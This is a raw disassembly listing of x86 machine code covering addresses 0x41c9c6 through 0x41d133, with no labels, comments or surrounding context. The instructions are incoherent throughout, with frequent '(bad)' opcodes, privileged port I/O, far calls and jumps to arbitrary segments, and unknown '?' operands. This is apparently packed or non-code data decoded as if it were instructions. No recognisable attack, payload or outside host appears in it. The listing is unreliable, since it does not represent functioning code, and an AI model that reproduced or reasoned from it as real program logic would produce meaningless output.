  41c9c6:	int3   
  41c9c7:	retf   
  41c9c8:	call   0xf2993218
  41c9cd:	and    ecx,esi
  41c9cf:	add    ebp,DWORD PTR [edi-0x66]
  41c9d2:	pop    edx
  41c9d3:	mov    dh,0x93
  41c9d5:	mov    dl,BYTE PTR [ebp+0x7a307c2c]
  41c9db:	clc    
  41c9dc:	sub    al,0x35
  41c9de:	pop    edi
  41c9df:	stos   DWORD PTR es:[edi],eax
  41c9e0:	pop    esp
  41c9e1:	ins    DWORD PTR es:[edi],dx
  41c9e2:	or     ecx,DWORD PTR [edx]
  41c9e4:	cmp    al,0xa8
  41c9e6:	(bad)  
  41c9e7:	in     al,0x7c
  41c9e9:	xchg   ebp,eax
  41c9ea:	enter  0xcd5f,0x38
  41c9ee:	ret    0x9687
  41c9f1:	out    dx,al
  41c9f2:	inc    edi
  41c9f3:	fst    QWORD PTR ds:0x5dac54a4
  41c9f9:	call   0xdd87:0x8e0fe714
  41ca00:	cmp    al,0xb6
  41ca02:	add    bl,dl
  41ca04:	mov    cl,0x1f
  41ca06:	retf   
  41ca07:	cli    
  41ca08:	ficom  WORD PTR [esi+0x723f95cb]
  41ca0e:	push   cs
  41ca0f:	bound  esp,QWORD PTR [edi]
  41ca11:	and    BYTE PTR ds:0xcdd2e0da,dh
  41ca17:	(bad)  
  41ca18:	mov    esi,0xaf6b1661
  41ca1d:	jle    0x41ca26
  41ca1f:	mov    bl,0x89
  41ca21:	in     eax,dx
  41ca22:	mov    ecx,0x4f4f0d52
  41ca27:	fcmovnu st,st(6)
  41ca29:	xchg   DWORD PTR [ebp-0x24],eax
  41ca2c:	push   edi
  41ca2d:	enter  0x1ddc,0xae
  41ca31:	inc    edi
  41ca32:	or     eax,0x9e13d88e
  41ca37:	inc    edx
  41ca38:	imul   ecx,DWORD PTR [eax+0x8e50724],0x17b065dd
  41ca42:	ins    DWORD PTR es:[edi],dx
  41ca43:	push   cs
  41ca44:	enter  0x8e57,0x98
  41ca48:	or     cl,bl
  41ca4a:	je     0x41ca1c
  41ca4c:	inc    ecx
  41ca4d:	xchg   esp,eax
  41ca4e:	sub    ecx,DWORD PTR [ebx+edi*2+0x50]
  41ca52:	xor    eax,0xd90713a7
  41ca57:	js     0x41caa9
  41ca59:	sub    eax,ebp
  41ca5b:	mov    ah,0x22
  41ca5d:	fsub   st(1),st
  41ca5f:	lahf   
  41ca60:	(bad)  
  41ca61:	mov    al,ds:0x6b2ad45d
  41ca66:	js     0x41cadf
  41ca68:	ja     0x41ca7f
  41ca6a:	ds xchg edi,eax
  41ca6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca6d:	test   al,0xa8
  41ca6f:	xchg   BYTE PTR [ebx],al
  41ca71:	test   ax,0xdac0
  41ca75:	scas   al,BYTE PTR es:[edi]
  41ca76:	inc    ebp
  41ca77:	mov    dl,0x27
  41ca79:	fldenv [ebp+eax*1-0x33]
  41ca7d:	pop    edx
  41ca7e:	xor    al,bh
  41ca80:	dec    esp
  41ca81:	popf   
  41ca82:	ss ins BYTE PTR es:[edi],dx
  41ca84:	stos   DWORD PTR es:[edi],eax
  41ca85:	cmp    BYTE PTR [esi+0x2a],ah
  41ca88:	jbe    0x41ca20
  41ca8a:	add    al,0x42
  41ca8c:	or     al,0xcd
  41ca8e:	das    
  41ca8f:	jno    0x41ca87
  41ca91:	daa    
  41ca92:	push   ebp
  41ca93:	arpl   WORD PTR [ecx-0x19f24102],cx
  41ca99:	jl     0x41ca1f
  41ca9b:	mov    bh,0x49
  41ca9d:	sbb    DWORD PTR [edi+eax*1-0xbb593cc],ebp
  41caa4:	mov    DWORD PTR [edx-0x32d7a41c],eax
  41caaa:	out    dx,al
  41caab:	and    ecx,DWORD PTR [ecx-0x20]
  41caae:	dec    esp
  41caaf:	mov    ds:0x31f9cef,eax
  41cab4:	dec    ecx
  41cab5:	in     eax,0x62
  41cab7:	pop    ss
  41cab8:	pop    ebp
  41cab9:	ds jbe 0x41ca89
  41cabc:	call   0x9350ad6b
  41cac1:	and    ebx,DWORD PTR [ebx]
  41cac3:	push   esp
  41cac4:	cld    
  41cac5:	lods   al,BYTE PTR ds:[esi]
  41cac6:	call   0x72f0:0x62a9eeb7
  41cacd:	ret    0x3e21
  41cad0:	repnz or al,0xe5
  41cad3:	fwait
  41cad4:	xchg   ebx,eax
  41cad5:	mov    ebx,0x214608e
  41cada:	sub    eax,0xd608ffb8
  41cadf:	mov    cl,0x35
  41cae1:	jns    0x41cad9
  41cae3:	stos   DWORD PTR es:[edi],eax
  41cae4:	rol    DWORD PTR ds:0x2694e9ef,cl
  41caea:	in     al,dx
  41caeb:	cmc    
  41caec:	pop    es
  41caed:	ja     0x41ca71
  41caef:	or     esi,DWORD PTR [ecx-0x518847e8]
  41caf5:	std    
  41caf6:	mov    eax,fs
  41caf8:	nop
  41caf9:	inc    edx
  41cafa:	shl    DWORD PTR [eax-0x62],1
  41cafd:	clc    
  41cafe:	sub    al,0xb5
  41cb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb01:	cs test eax,0x10c3adf2
  41cb07:	xchg   esp,eax
  41cb08:	inc    DWORD PTR [ecx+0x26]
  41cb0b:	sub    DWORD PTR [esi],esp
  41cb0d:	sbb    BYTE PTR [esi],al
  41cb0f:	mov    esp,0xd52deeca
  41cb14:	icebp  
  41cb15:	sub    BYTE PTR ds:[esi-0x74],al
  41cb19:	add    al,0x7e
  41cb1b:	sub    eax,0x70a94af6
  41cb20:	fidiv  DWORD PTR ds:0x3019153b
  41cb26:	adc    eax,0x28b7ebc8
  41cb2b:	xor    DWORD PTR [eax],0x789b4b06
  41cb31:	xor    ch,BYTE PTR [esi-0x53fa1fd2]
  41cb37:	inc    ebx
  41cb38:	mov    ch,0x6b
  41cb3a:	(bad)  
  41cb3c:	cmc    
  41cb3d:	push   ds
  41cb3e:	or     bh,BYTE PTR ds:0xd1a438f6
  41cb44:	push   ebp
  41cb45:	push   edx
  41cb46:	arpl   WORD PTR [ebx-0xc],cx
  41cb49:	sub    al,bh
  41cb4b:	pop    esi
  41cb4c:	jne    0x41cb69
  41cb4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb4f:	inc    ebx
  41cb50:	inc    esi
  41cb51:	inc    esp
  41cb52:	retf   0x8907
  41cb55:	fidivr WORD PTR gs:[edi+0x5639c975]
  41cb5c:	cmc    
  41cb5d:	xor    al,0x95
  41cb5f:	in     al,dx
  41cb60:	out    0xbc,eax
  41cb62:	add    bh,BYTE PTR [ecx+0x18]
  41cb65:	jle    0x41cbdf
  41cb67:	jb     0x41cb9c
  41cb69:	add    ebx,DWORD PTR ds:0x353963b9
  41cb6f:	mov    ebp,0x927bee11
  41cb74:	cld    
  41cb75:	pop    ecx
  41cb76:	adc    eax,0xd4a72198
  41cb7b:	and    al,0xc1
  41cb7d:	cmp    cl,cl
  41cb7f:	sbb    eax,0x656401ab
  41cb84:	add    DWORD PTR [esi*4+0x76f8baca],esp
  41cb8b:	test   BYTE PTR [ebx+edx*4],ah
  41cb8e:	gs jle 0x41cb7c
  41cb91:	lea    ecx,[esp+edi*2]
  41cb94:	ja     0x41cb4a
  41cb96:	jp     0x41cbcc
  41cb98:	les    esi,FWORD PTR [edi+0x1b]
  41cb9b:	push   ebp
  41cb9c:	jle    0x41cb3d
  41cb9e:	out    0xe,eax
  41cba0:	sbb    dh,ah
  41cba2:	popa   
  41cba3:	or     DWORD PTR [esi+0x68],0xfffffff5
  41cba7:	push   esi
  41cba8:	jno    0x41cbbf
  41cbaa:	rol    DWORD PTR [edx+0xce573bf],cl
  41cbb0:	fisttp DWORD PTR [edi]
  41cbb2:	add    al,0x86
  41cbb4:	or     esp,DWORD PTR [esi]
  41cbb6:	cmp    eax,0xa4d77d56
  41cbbb:	adc    bh,BYTE PTR [eax+0x4d]
  41cbbe:	mul    BYTE PTR [ebp+0x26d6f587]
  41cbc4:	(bad)
  41cbc9:	jp     0x41cbbd
  41cbcb:	lds    edx,FWORD PTR [ebx+0x7f99e2b]
  41cbd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbd2:	inc    edi
  41cbd3:	push   ecx
  41cbd4:	push   ebx
  41cbd5:	xor    eax,0x7a4132d5
  41cbda:	fisttp QWORD PTR [ebp+eiz*2+0x3f]
  41cbde:	push   0xffffffe6
  41cbe0:	lahf   
  41cbe1:	mov    ebp,ds
  41cbe3:	sti    
  41cbe4:	mov    ch,0x4
  41cbe6:	push   eax
  41cbe7:	cmp    eax,0xad51b145
  41cbec:	pop    esi
  41cbed:	ss in  eax,dx
  41cbef:	cwde   
  41cbf0:	daa    
  41cbf1:	xor    BYTE PTR [ebx-0x4121d5d7],bl
  41cbf7:	repz sahf 
  41cbf9:	xor    eax,0xf41005b9
  41cbfe:	cmp    DWORD PTR [ecx],ecx
  41cc00:	in     eax,dx
  41cc01:	in     eax,0xc1
  41cc03:	popa   
  41cc04:	cmp    edx,DWORD PTR [eax+0x43]
  41cc07:	adc    BYTE PTR [edi+0x52],0xc7
  41cc0b:	in     al,0xaa
  41cc0d:	mov    fs,WORD PTR [edx+0xc7f0393]
  41cc13:	sbb    edx,eax
  41cc15:	lock ins BYTE PTR es:[edi],dx
  41cc17:	mov    ds:0x3344f663,al
  41cc1c:	aam    0xa8
  41cc1e:	into   
  41cc1f:	popa   
  41cc20:	mov    ecx,0x3bb49350
  41cc25:	aad    0xf2
  41cc27:	jmp    0x41cbab
  41cc29:	test   eax,0x1a1549b7
  41cc2e:	stos   DWORD PTR es:[edi],eax
  41cc2f:	mov    es,WORD PTR [eax+edi*4+0x3a5854ca]
  41cc36:	add    esi,DWORD PTR [ebx+0x55a37c65]
  41cc3c:	int3   
  41cc3d:	push   esi
  41cc3e:	push   edi
  41cc3f:	scas   al,BYTE PTR es:[edi]
  41cc40:	mov    ds,WORD PTR [eax+0x6e316fdc]
  41cc46:	xchg   ebx,eax
  41cc47:	adc    DWORD PTR [eax-0x15],0x8710331f
  41cc4e:	popa   
  41cc4f:	(bad)  
  41cc50:	xchg   esi,eax
  41cc51:	fadd   QWORD PTR [ecx+edi*4+0x465ecae]
  41cc58:	mov    bh,0x1
  41cc5a:	xchg   DWORD PTR [eax+0x76],ecx
  41cc5d:	retf   
  41cc5e:	sub    eax,0xdff75441
  41cc63:	imul   eax,ecx,0x25972a7f
  41cc69:	push   ebx
  41cc6a:	cmp    eax,0x82d50270
  41cc6f:	daa    
  41cc70:	adc    bh,BYTE PTR [eax+edi*4]
  41cc73:	push   0x8fc1684f
  41cc78:	and    DWORD PTR [ebx-0x57],0xffffff82
  41cc7c:	clc    
  41cc7d:	xor    bh,bh
  41cc7f:	cmp    al,0x8
  41cc81:	clc    
  41cc82:	test   al,0xb0
  41cc84:	jmp    0xe568:0x196685ea
  41cc8b:	pop    esp
  41cc8c:	mov    eax,0xd17d3494
  41cc91:	and    al,0x25
  41cc93:	and    BYTE PTR [edi+ebx*1],al
  41cc96:	push   ebx
  41cc97:	popf   
  41cc98:	dec    edx
  41cc99:	pop    ecx
  41cc9a:	push   es
  41cc9b:	retf   
  41cc9c:	lahf   
  41cc9d:	cmp    cx,WORD PTR [ebx]
  41cca0:	rcr    edi,cl
  41cca2:	(bad)  
  41cca3:	cli    
  41cca4:	xor    cl,dl
  41cca6:	sbb    ch,BYTE PTR [edx-0x22]
  41cca9:	daa    
  41ccaa:	jp     0x41cccb
  41ccac:	dec    edx
  41ccad:	retf   0xae50
  41ccb0:	push   cs
  41ccb1:	push   ss
  41ccb2:	popa   
  41ccb3:	cwde   
  41ccb4:	mov    ebp,0x805eafa
  41ccb9:	and    eax,0xd827e881
  41ccbe:	lods   eax,DWORD PTR ds:[esi]
  41ccbf:	jnp    0x41ccd8
  41ccc1:	je     0x41cd42
  41ccc3:	push   edx
  41ccc4:	adc    ebp,esp
  41ccc6:	(bad)  
  41ccc8:	or     eax,0x1072de80
  41cccd:	bnd jae 0x41cce9
  41ccd0:	jb     0x41ccc3
  41ccd2:	out    0xd4,eax
  41ccd4:	or     ch,BYTE PTR [esp+eax*4-0x4362cd84]
  41ccdb:	sbb    BYTE PTR [ebx],0x9b
  41ccde:	push   edi
  41ccdf:	add    DWORD PTR ss:[esi+0x3e],0x4c688733
  41cce7:	iret   
  41cce8:	mov    edi,0x85763648
  41cced:	jmp    0x41cd46
  41ccef:	icebp  
  41ccf0:	mov    dl,0xac
  41ccf2:	push   ds
  41ccf3:	jb     0x41cd0c
  41ccf5:	ins    DWORD PTR es:[edi],dx
  41ccf6:	aam    0x43
  41ccf8:	push   ss
  41ccf9:	mov    cl,BYTE PTR [edx+0x40]
  41ccfc:	ins    DWORD PTR es:[edi],dx
  41ccfd:	pop    ebx
  41ccfe:	cwde   
  41ccff:	xor    edx,ecx
  41cd01:	mov    DWORD PTR [ebp+0x7585bb99],ecx
  41cd07:	in     al,0x15
  41cd09:	sti    
  41cd0a:	push   0x49
  41cd0c:	aaa    
  41cd0d:	sub    al,0xd6
  41cd10:	sti    
  41cd11:	mov    edx,edi
  41cd13:	adc    eax,0x72f651ec
  41cd18:	sbb    dh,BYTE PTR [esi-0x7d]
  41cd1b:	mov    al,0xc5
  41cd1d:	and    DWORD PTR [ebx],0xffffffb1
  41cd20:	jne    0x41ccd1
  41cd22:	sub    dl,BYTE PTR [esi-0x50006eee]
  41cd28:	test   eax,0xd8137cb9
  41cd2d:	pop    eax
  41cd2e:	repz mov edi,0xa015ec0c
  41cd34:	fild   DWORD PTR [eax+edi*4]
  41cd37:	mov    al,ds:0xc151739a
  41cd3c:	push   ebp
  41cd3d:	lea    edi,[edx]
  41cd3f:	(bad)  
  41cd40:	loopne 0x41cd34
  41cd42:	add    DWORD PTR [edi],edx
  41cd44:	push   es
  41cd45:	inc    eax
  41cd46:	adc    al,0xd4
  41cd48:	push   eax
  41cd49:	push   es
  41cd4a:	jne    0x41cd0c
  41cd4c:	jo     0x41cd6b
  41cd4e:	lods   eax,DWORD PTR ds:[esi]
  41cd4f:	pop    ecx
  41cd50:	pop    edx
  41cd51:	pop    ebp
  41cd52:	mov    dh,BYTE PTR [ebx]
  41cd54:	mov    ds:0xc38cb992,al
  41cd59:	pop    ds
  41cd5a:	mov    bl,0xbb
  41cd5c:	inc    ebp
  41cd5d:	ret    0xcbc9
  41cd60:	iret   
  41cd61:	pop    ebp
  41cd62:	or     al,0xa4
  41cd64:	lahf   
  41cd65:	add    ecx,ecx
  41cd67:	inc    eax
  41cd68:	out    dx,eax
  41cd69:	jl     0x41cde4
  41cd6b:	inc    esi
  41cd6c:	cmp    BYTE PTR [ebp+0x58e3d9b8],ah
  41cd72:	mov    bl,0x51
  41cd74:	push   ds
  41cd75:	(bad)  
  41cd76:	shl    BYTE PTR [ecx-0x9],0x8f
  41cd7a:	out    0x3b,al
  41cd7c:	push   eax
  41cd7d:	or     DWORD PTR [esi],edi
  41cd7f:	int3   
  41cd80:	adc    DWORD PTR [ecx-0x704633ae],edx
  41cd86:	aas    
  41cd87:	xchg   ebx,esp
  41cd89:	mov    eax,ds:0xb9c2b728
  41cd8e:	ror    BYTE PTR [ebx+0x33],0xf2
  41cd92:	dec    ebp
  41cd93:	xchg   ecx,eax
  41cd94:	in     eax,0x94
  41cd96:	rol    BYTE PTR [ebx-0x77],cl
  41cd99:	iret   
  41cd9a:	xchg   BYTE PTR [eax-0x4c],bl
  41cd9d:	shl    edi,1
  41cd9f:	adc    al,0xe5
  41cda1:	and    bl,bl
  41cda3:	adc    eax,0x467f39eb
  41cda8:	test   al,0x6b
  41cdaa:	push   eax
  41cdab:	call   0xb6e2:0x800c33c2
  41cdb2:	cwde   
  41cdb3:	pusha  
  41cdb4:	std    
  41cdb5:	std    
  41cdb6:	xchg   esi,eax
  41cdb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb8:	cld    
  41cdb9:	mov    edx,0x1ea0142e
  41cdbe:	jae    0x41ce06
  41cdc0:	push   ebp
  41cdc1:	add    ecx,ebp
  41cdc3:	gs mov cl,0x98
  41cdc6:	mov    edi,0x327a921d
  41cdcb:	pop    eax
  41cdcc:	push   eax
  41cdcd:	mov    eax,edi
  41cdcf:	inc    edi
  41cdd0:	lods   eax,DWORD PTR ds:[esi]
  41cdd1:	shr    DWORD PTR [edx],cl
  41cdd3:	fild   QWORD PTR [ebp-0x5825d0e3]
  41cdd9:	test   ch,dh
  41cddb:	icebp  
  41cddc:	push   cs
  41cddd:	and    BYTE PTR [ebp+0x3e],ah
  41cde0:	out    0xa7,eax
  41cde2:	das    
  41cde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cde4:	jmp    0x728c28a3
  41cde9:	push   ds
  41cdea:	test   DWORD PTR [ecx+edi*4+0x5d],0xedd03a0a
  41cdf2:	push   esp
  41cdf3:	xor    dl,BYTE PTR [ebp+eiz*2+0x703aefde]
  41cdfa:	aad    0x7e
  41cdfc:	cmp    BYTE PTR [edx+0x1a],0xc
  41ce00:	inc    esp
  41ce01:	dec    ebx
  41ce02:	mul    DWORD PTR [ecx]
  41ce04:	adc    dh,BYTE PTR [edi]
  41ce06:	scas   eax,DWORD PTR es:[edi]
  41ce07:	jmp    0xdcbe:0xeef9cd7
  41ce0e:	imul   BYTE PTR [esi-0x2f8299f2]
  41ce14:	jnp    0x41ce77
  41ce16:	add    eax,DWORD PTR [ebx]
  41ce18:	inc    ebx
  41ce19:	inc    ecx
  41ce1a:	or     eax,0xe5dd1c1b
  41ce1f:	aam    0x9e
  41ce21:	and    BYTE PTR [ebx],ch
  41ce23:	jo     0x41cdfa
  41ce25:	or     ebp,ecx
  41ce27:	fild   QWORD PTR [ebx]
  41ce29:	sub    BYTE PTR [edi+0x7f],al
  41ce2c:	dec    esi
  41ce2d:	inc    edi
  41ce2e:	leave  
  41ce2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce30:	mov    BYTE PTR [eax-0x56f38159],bh
  41ce36:	in     al,dx
  41ce37:	mov    DWORD PTR [edi],0xe3432679
  41ce3d:	ror    edi,cl
  41ce3f:	sbb    al,0x7d
  41ce41:	add    eax,0x10fb48c7
  41ce46:	or     BYTE PTR [ebx-0x6c4a5ebd],ch
  41ce4c:	mov    ds:0xe7822ac9,al
  41ce51:	pop    ebp
  41ce52:	int3   
  41ce53:	aas    
  41ce54:	adc    eax,0x747ae15
  41ce59:	mov    ds:0x1a220748,eax
  41ce5e:	loopne 0x41ceb7
  41ce60:	(bad)  
  41ce62:	and    BYTE PTR [ebx+eiz*2-0x5d],bh
  41ce66:	sbb    al,0xa5
  41ce68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce69:	ds cs icebp 
  41ce6c:	push   edi
  41ce6d:	xchg   esi,eax
  41ce6e:	pop    ebp
  41ce6f:	xchg   ebp,eax
  41ce70:	fild   WORD PTR [ebx+0xcd8fd4b]
  41ce76:	or     ch,dl
  41ce78:	cmc    
  41ce79:	cmp    al,BYTE PTR [ebx+0xa]
  41ce7c:	repnz add al,0x84
  41ce7f:	in     al,0x47
  41ce81:	repz pusha 
  41ce83:	jns    0x41cedc
  41ce85:	test   eax,0xa7d2f896
  41ce8a:	or     al,0x13
  41ce8c:	push   ebp
  41ce8d:	fmul   DWORD PTR [esi+0x6d87787e]
  41ce93:	jo     0x41cec4
  41ce95:	dec    esi
  41ce96:	fsub   st,st(4)
  41ce98:	paddb  mm4,QWORD PTR [ebp-0x47]
  41ce9c:	and    eax,0xdcc4cc70
  41cea1:	add    esp,DWORD PTR [edx+0x394d3383]
  41cea7:	les    ebp,FWORD PTR [eax+ecx*8+0xd]
  41ceab:	loopne 0x41cef8
  41cead:	test   al,0xef
  41ceaf:	rol    BYTE PTR [ecx+edi*2+0x49],cl
  41ceb3:	test   eax,0x5b0ae55d
  41ceb8:	push   es
  41ceb9:	jg     0x41ce40
  41cebb:	adc    al,0xb3
  41cebd:	retf   0x839f
  41cec0:	imul   eax,DWORD PTR [ebp-0x40],0xffffffa4
  41cec4:	pusha  
  41cec5:	xor    al,0x19
  41cec7:	dec    eax
  41cec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec9:	(bad)  
  41ceca:	and    BYTE PTR [edi+0x5d465184],al
  41ced0:	clc    
  41ced1:	addr16 add eax,0x10f30b31
  41ced7:	dec    edi
  41ced8:	scas   eax,DWORD PTR es:[edi]
  41ced9:	sbb    dh,0xe2
  41cedc:	and    ebx,DWORD PTR [esi+0x1ce5c5ab]
  41cee2:	sahf   
  41cee3:	sub    ebp,DWORD PTR [ebx]
  41cee5:	xlat   BYTE PTR ds:[ebx]
  41cee6:	dec    eax
  41cee7:	mov    ebx,0x46466221
  41ceec:	xchg   DWORD PTR [ebx-0x55215d0f],eax
  41cef2:	gs jge 0x41cf3e
  41cef5:	fst    QWORD PTR [esp+ebp*2+0x254985b6]
  41cefc:	pop    es
  41cefd:	inc    ebx
  41cefe:	sub    DWORD PTR [edx-0x6b],ecx
  41cf01:	retf   0x8d0
  41cf04:	fs stos DWORD PTR es:[edi],eax
  41cf06:	push   esp
  41cf07:	xchg   ebp,eax
  41cf08:	xchg   edx,eax
  41cf09:	lds    esi,FWORD PTR [esi-0x9c1f544]
  41cf0f:	ins    BYTE PTR es:[edi],dx
  41cf10:	mov    ecx,ebp
  41cf12:	cdq    
  41cf13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf14:	(bad)  
  41cf15:	or     eax,DWORD PTR [esi-0x10]
  41cf18:	in     eax,0x66
  41cf1a:	push   ebp
  41cf1b:	xor    DWORD PTR [edx+0x5e],0xfffffff7
  41cf1f:	test   DWORD PTR [edi-0x8],ebp
  41cf22:	mov    ebp,0x9e41d5c0
  41cf27:	scas   al,BYTE PTR es:[edi]
  41cf28:	push   edi
  41cf29:	push   edi
  41cf2a:	pop    ebp
  41cf2b:	mul    BYTE PTR [esi-0x33]
  41cf2e:	std    
  41cf2f:	and    BYTE PTR [eax+esi*1-0x48],0x8d
  41cf34:	push   esi
  41cf35:	inc    ebp
  41cf36:	loop   0x41cf3d
  41cf38:	lds    edi,FWORD PTR [eax+0x1993f61e]
  41cf3e:	adc    eax,0x49d5fba7
  41cf43:	jb     0x41ceea
  41cf45:	int    0x53
  41cf47:	mov    ds:0x6630ff9,eax
  41cf4c:	xor    eax,0xf3cce161
  41cf51:	jo     0x41cfc1
  41cf53:	sub    bl,BYTE PTR [eax]
  41cf55:	jp     0x41cfb4
  41cf57:	cmp    edx,ebp
  41cf59:	call   0xc98c:0x59b8967
  41cf60:	add    BYTE PTR [ebp+0x6792256e],dh
  41cf66:	mov    bh,0x1c
  41cf68:	xchg   edx,eax
  41cf69:	nop
  41cf6a:	or     DWORD PTR [edi],edi
  41cf6c:	(bad)  
  41cf6d:	fisttp WORD PTR [esi+0x1f]
  41cf70:	dec    esp
  41cf71:	sub    al,BYTE PTR [ebx]
  41cf73:	arpl   di,cx
  41cf75:	call   0x48f6:0x8d01c2ca
  41cf7c:	enter  0xce02,0x7b
  41cf80:	mul    DWORD PTR [edi]
  41cf82:	mul    DWORD PTR [eax]
  41cf84:	xchg   DWORD PTR [edx],esi
  41cf86:	mov    esi,0x99a64a87
  41cf8b:	call   0x8631:0x22c89996
  41cf92:	lds    ebp,FWORD PTR [ecx-0x4428f16e]
  41cf98:	shl    BYTE PTR [ecx-0x9a53b09],cl
  41cf9e:	aad    0xf3
  41cfa0:	cs jne 0x41cfb5
  41cfa3:	ret    0x5ae4
  41cfa6:	not    DWORD PTR [esi-0x16]
  41cfa9:	adc    al,BYTE PTR [esi]
  41cfab:	xor    dl,BYTE PTR [eax-0x35]
  41cfae:	sbb    eax,0xe2154a0b
  41cfb3:	pop    esi
  41cfb4:	cli    
  41cfb5:	aad    0x4d
  41cfb7:	xor    BYTE PTR ds:0x9d8ffaf9,ch
  41cfbd:	mov    ds:0x54bf1ca5,eax
  41cfc2:	aam    0x90
  41cfc4:	adc    ch,0xb9
  41cfc7:	mov    edi,0x654f2eeb
  41cfcc:	jmp    0x41cf6d
  41cfce:	adc    ah,0xa6
  41cfd1:	pop    edx
  41cfd2:	pushf  
  41cfd3:	inc    edi
  41cfd4:	cld    
  41cfd5:	imul   edx,DWORD PTR [ebp+ebx*2-0x673f1dde],0x61
  41cfdd:	verw   WORD PTR [ebx+0x23]
  41cfe1:	push   DWORD PTR [eax-0x5d]
  41cfe4:	in     al,dx
  41cfe5:	cmp    DWORD PTR [edi],ebp
  41cfe7:	inc    ebp
  41cfe8:	lock push esp
  41cfea:	mov    ebp,0xb0f36566
  41cfef:	fs mov bh,0x48
  41cff2:	mov    ebp,0xadfa0f62
  41cff7:	adc    dl,BYTE PTR [edx+0x73]
  41cffa:	sar    BYTE PTR [edi],1
  41cffc:	stc    
  41cffd:	jl     0x41cfe8
  41cfff:	int    0xa7
  41d001:	mov    edx,DWORD PTR [esi]
  41d003:	aad    0xd2
  41d005:	add    BYTE PTR [edx-0x6e],bh
  41d008:	loope  0x41cfc4
  41d00a:	xor    dl,dl
  41d00c:	adc    DWORD PTR [esi+0x56],ecx
  41d00f:	ret    0x743a
  41d012:	push   es
  41d013:	jge    0x41cfa7
  41d015:	xchg   edx,eax
  41d016:	push   esi
  41d017:	cmp    ebx,DWORD PTR [edx]
  41d019:	mov    dl,0x8c
  41d01b:	stos   DWORD PTR es:[edi],eax
  41d01c:	cld    
  41d01d:	add    edi,DWORD PTR [eax]
  41d01f:	aad    0x7b
  41d021:	(bad)  
  41d022:	out    dx,eax
  41d023:	sbb    DWORD PTR [ebp*8-0x4541534f],eax
  41d02a:	in     eax,dx
  41d02b:	pop    eax
  41d02c:	fcom   DWORD PTR [edx+eiz*1-0x57501298]
  41d033:	sahf   
  41d034:	pop    edx
  41d035:	and    dl,BYTE PTR [edx+0x13]
  41d038:	and    BYTE PTR [esi+0x65a426e6],0xbe
  41d03f:	jne    0x41d05b
  41d041:	icebp  
  41d042:	dec    eax
  41d043:	rol    ecx,0x10
  41d046:	add    BYTE PTR [esi],bh
  41d048:	sbb    DWORD PTR [ebx-0x596c572a],eax
  41d04e:	retf   0x340
  41d051:	pop    ss
  41d052:	push   ebp
  41d053:	cld    
  41d054:	je     0x41d08b
  41d056:	ja     0x41d0bc
  41d058:	pop    ecx
  41d059:	or     al,0x84
  41d05b:	out    dx,al
  41d05c:	int3   
  41d05d:	add    al,0x22
  41d05f:	std    
  41d060:	adc    DWORD PTR [eax+0x3ac977d9],0xffffff81
  41d067:	pusha  
  41d068:	fs ins BYTE PTR es:[edi],dx
  41d06a:	fcmovne st,st(7)
  41d06c:	pop    edx
  41d06d:	sbb    al,bl
  41d06f:	mov    esi,0x959ed2d3
  41d074:	add    ecx,eax
  41d076:	jnp    0x41d093
  41d078:	call   0x2065fd9
  41d07d:	inc    esi
  41d07e:	ins    DWORD PTR es:[edi],dx
  41d07f:	jae    0x41d05a
  41d081:	mov    ds:0x6f9fe93a,al
  41d086:	pop    ebx
  41d087:	popf   
  41d088:	jnp    0x41d04d
  41d08a:	cmc    
  41d08b:	sub    ebp,edi
  41d08d:	sbb    esi,DWORD PTR [ecx-0x5b]
  41d090:	inc    edi
  41d091:	rcl    BYTE PTR [edx-0x3],cl
  41d094:	xor    ch,dh
  41d096:	mov    ebx,0x77c421a2
  41d09b:	setb   ah
  41d09e:	jle    0x41d107
  41d0a0:	addr16 int3 
  41d0a2:	fwait
  41d0a3:	scas   al,BYTE PTR es:[edi]
  41d0a4:	xor    ah,BYTE PTR [esi-0x38ec8e43]
  41d0aa:	mov    ebx,0x5ab8256f
  41d0af:	push   ebx
  41d0b0:	aam    0xf6
  41d0b2:	mov    ebp,0xa3be6bfb
  41d0b7:	mov    WORD PTR [esi],?
  41d0b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0ba:	mov    ebx,DWORD PTR [ecx]
  41d0bc:	mov    ?,WORD PTR [esi-0x2b]
  41d0bf:	iret   
  41d0c0:	sbb    ebx,DWORD PTR [ebx]
  41d0c2:	sbb    DWORD PTR [eax+0x49c77781],0xffffffec
  41d0c9:	data16 hlt 
  41d0cb:	fsub   DWORD PTR [ebp+0x5a]
  41d0ce:	jp     0x41d07d
  41d0d0:	sbb    ch,dl
  41d0d2:	xchg   DWORD PTR [ecx+0x74b1971e],ebp
  41d0d8:	jb     0x41d06a
  41d0da:	add    BYTE PTR cs:[eax+0x6e],al
  41d0de:	cmp    eax,0x1a4b8136
  41d0e3:	(bad)  
  41d0e4:	xadd   BYTE PTR [eax+0x2a5f1d37],ch
  41d0eb:	xchg   ebp,eax
  41d0ec:	jb     0x41d0f0
  41d0ee:	cmp    bh,al
  41d0f0:	cmp    eax,0x5d3dcb83
  41d0f5:	scas   eax,DWORD PTR es:[edi]
  41d0f6:	pop    ecx
  41d0f7:	or     ebp,DWORD PTR [edi+0x361aa413]
  41d0fd:	ins    BYTE PTR es:[edi],dx
  41d0fe:	sub    ah,BYTE PTR [ebx]
  41d100:	in     al,0x2a
  41d102:	les    esi,FWORD PTR [esi+0x49debf81]
  41d108:	ss ja  0x41d178
  41d10b:	nop
  41d10c:	sti    
  41d10d:	mov    esi,0x836f3b4f
  41d112:	aaa    
  41d113:	push   0xffffffbd
  41d115:	cmp    edi,DWORD PTR [ebp+0x34]
  41d118:	jno    0x41d0f9
  41d11a:	ret    0xca0f
  41d11d:	cmp    esi,ebx
  41d11f:	xchg   edx,eax
  41d120:	xor    eax,0xc25a1efa
  41d125:	repz mov es,WORD PTR [edi]
  41d128:	add    al,0x34
  41d12a:	sub    DWORD PTR [ecx-0x6f5a15c0],eax
  41d130:	xchg   ebp,eax
  41d131:	cmp    eax,ebp
  41d133:	pop    esp
